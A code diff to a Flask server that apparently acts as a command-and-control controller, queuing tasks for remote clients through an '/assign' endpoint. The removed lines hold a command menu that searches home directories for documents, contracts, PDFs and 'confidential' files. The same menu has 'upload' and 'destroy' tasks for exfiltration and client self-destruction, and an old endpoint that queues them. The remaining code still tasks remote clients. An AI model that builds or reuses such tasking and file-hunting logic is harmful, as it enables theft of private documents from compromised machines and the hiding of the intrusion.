@@ -12,17 +12,7 @@ latest_result = None
 app = Flask(__name__)
 
 # Predefined command menu
-"""
-command_menu = {
-    0: "find ~ -iname '*.doc*' -o -iname '*.odt' -o -iname '*.txt'",
-    1: "find /home -iname '*draft*' -o -iname '*report*'",
-    2: "find /home -iname '*contract*' -o -iname '*.pdf'",
-    3: "grep -ril 'confidential' /home",
-    4: 'upload', # Special non-Linux command that requests specific files
-    5: 'destroy', # Special non-Linux command that causes client to self-destruct
-    6: "ls -la" # For testing
-}
-"""
+
 
 command_menu = {
    0: "pwd",
@@ -87,24 +77,6 @@ def send_public_key():
     return jsonify({"Success": "Yay"}), 200
 
 # A controller can invoke this endpoint to task the client
-"""
-@app.route('/assign/<int:cmd_index>', methods=['POST'])
-def assign_command(cmd_index):
-    if 0 <= cmd_index < len(command_menu):
-        if cmd_index == 4:
-            data = request.get_json()
-            path = data.get('path')
-            if not path:
-                return jsonify({"error": "Missing 'path'"}), 400
-            tasks.put(f"upload {path}")
-            return jsonify({"message": f"Queued upload: {path}"})
-        else:
-            tasks.put(command_menu[cmd_index])
-            return jsonify({"message": f"Queued: {command_menu[cmd_index]}"})
-    else:
-        return jsonify({"error": "Bad Request"}), 400
-"""
-
 
 # A controller can invoke this endpoint to task the client
 @app.route('/assign/<int:cmd_index>', methods=['POST'])
